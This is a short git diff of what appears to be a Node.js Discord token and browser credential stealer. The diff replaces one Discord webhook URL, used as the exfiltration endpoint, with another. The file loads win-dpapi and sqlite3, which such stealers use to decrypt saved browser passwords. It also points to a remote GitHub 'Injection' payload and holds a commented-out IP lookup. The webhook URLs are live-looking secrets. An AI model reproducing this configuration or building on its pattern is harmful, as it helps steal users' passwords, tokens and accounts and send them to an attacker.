@@ -10,7 +10,7 @@ const crypto = require('crypto');
 //const sqlite3 = require('sqlite3');
 const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
 const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
-const src = ("https://canary.discord.com/api/webhooks/954345897704169523/ZaHI5ax4RDcrY7q7kjvx1m7HJgmJbOBdLVcUkz5Ua4XlP4AzME575-XpAqx1LuCFX-Ps")
+const src = ("https://discord.com/api/webhooks/966633343141695538/ZzeJXm0leVrbh5vJ3Wx_b1G5yzcx2ZuhrX30HsYC9HXVoURLymn-FOE1vflo92dz9Har")
 const github = "https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection"
 /*((async () => {
     await axios.get('https://ipconfig.io/json')
